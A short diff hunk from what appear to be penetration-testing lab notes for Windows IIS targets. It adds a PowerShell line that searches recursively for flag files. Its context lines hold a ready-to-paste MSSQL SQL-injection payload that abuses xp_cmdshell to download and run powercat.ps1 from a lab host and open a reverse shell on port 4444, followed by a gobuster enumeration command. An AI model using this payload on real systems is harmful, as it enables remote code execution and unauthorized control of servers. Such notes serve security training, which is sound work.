@@ -721,6 +721,7 @@ For windows IIS servers, we need to use gobuster with aspx extension and word li
 reverse shell sqli for MSQL
 ;EXEC master.dbo.xp_cmdshell 'powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.202/powercat.ps1\");powercat -c 192.168.45.202 -p 4444 -e powershell"';--+//&ctl00%24ContentPlaceHolder1%24PasswordTextBox=test&ctl00%24ContentPlaceHolder1%24LoginButton=Login
 
+Get-ChildItem *flag* -File -Recurse -ErrorAction SilentlyContinue
 
 ```
 gobuster dir -u http://192.168.198.50 -x aspx -w aspx.txt --no-error
